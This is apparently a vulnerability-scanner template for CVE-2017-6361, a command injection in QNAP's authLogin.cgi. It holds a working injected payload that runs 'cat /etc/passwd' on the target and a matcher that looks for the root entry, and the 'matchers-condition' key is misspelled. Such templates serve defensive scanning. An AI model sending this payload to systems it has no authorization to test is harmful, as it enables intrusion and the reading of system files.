id: cve-2017-6361

info:
  name: Command Injection in authLogin.cgi 'reboot_notice_msg'
  author: Harsh Bothra
  severity: Critical

# source:- https://www.exploit-db.com/exploits/41842

requests:
  - method: GET
    path:
      - '{{BaseURL}}/cgi-bin/authLogin.cgi?reboot_notice_msg=$(printf "QNAPVJBD%08d%16s  14`(echo;cat%20%2Fetc%2Fpasswd)>&2`" $(expr $(date +%s) % 100000000) Disconnect|base64|tr -d "\r\n")'

    machers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
